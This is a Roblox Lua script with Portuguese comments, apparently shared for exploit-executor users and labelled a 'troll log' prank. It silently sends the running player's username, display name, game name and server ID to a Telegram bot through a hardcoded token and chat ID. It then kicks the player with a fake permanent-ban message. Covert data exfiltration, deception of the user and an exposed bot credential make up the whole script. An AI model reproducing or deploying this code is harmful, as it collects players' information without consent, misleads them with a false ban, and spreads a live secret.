--[[
    ╔══════════════════════════════════════════════════════════╗
    ║               REYZIM SCRIPTS - TROLL LOG V4.1            ║
    ║        LOG SILENCIOSO + PEGADINHA DE BAN FALSO           ║
    ║        CRIADO POR: REYZIM | TIKTOK: @REYZIM_DZ           ║
    ╚══════════════════════════════════════════════════════════╝
]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- [ CONFIGURAÇÕES DO TELEGRAM ]
local TOKEN = "8500284543:AAGzMLvtIBmRVPzgMYEo9tdqd2GHoW6TUPI"
local CHAT_ID = "8766981973"

-- Detecta a função de request do executor
local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request

local function urlEncode(str)
    str = string.gsub(str, "\n", "\r\n")
    str = string.gsub(str, "([^%w %-%_%.%~])", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
    str = string.gsub(str, " ", "%%20")
    return str
end

local function enviarLogTelegram()
    task.spawn(function()
        local gameName = "Desconhecido"
        pcall(function()
            gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
        end)
        
        local time = os.date("%d/%m/%Y - %H:%M:%S")
        local device = "Mobile (Delta)"
        local jobId = game.JobId or "N/A"
        
        local mensagem = "🚀 *NOVA EXECUÇÃO - REYZIM SCRIPTS*\n\n" ..
                         "👤 *Usuário:* " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")\n" ..
                         "⏰ *Horário:* " .. time .. "\n" ..
                         "📱 *Celular Info:* " .. device .. "\n" ..
                         "🎮 *Game:* " .. gameName .. "\n" ..
                         "🆔 *Server ID:* `" .. jobId .. "`"

        local url = "https://api.telegram.org/bot" .. TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. urlEncode(mensagem) .. "&parse_mode=Markdown"
        
        if requestFunc then
            pcall(function()
                requestFunc({Url = url, Method = "GET"})
            end)
        else
            pcall(function()
                game:HttpGet(url)
            end)
        end
    end)
end

-- 1. Envia o log primeiro (Silenciosamente)
enviarLogTelegram()

-- 2. Espera 6 segundos para a pegadinha
task.wait(6)

-- 3. A PEGADINHA: Mensagem de Banimento Falso
local mensagemBan = "\n[REYZIM SCRIPTS ANTI-CHEAT]\n\n" ..
                    "Você foi banido permanentemente deste servidor.\n" ..
                    "Motivo: Uso de scripts externos detectado (Delta Executor).\n" ..
                    "Duração: Permanente\n" ..
                    "ID do Banimento: #RZ-" .. math.random(10000, 99999) .. "\n\n" ..
                    "Se você acha que isso é um erro, entre em contato com o suporte."

LocalPlayer:Kick(mensagemBan)
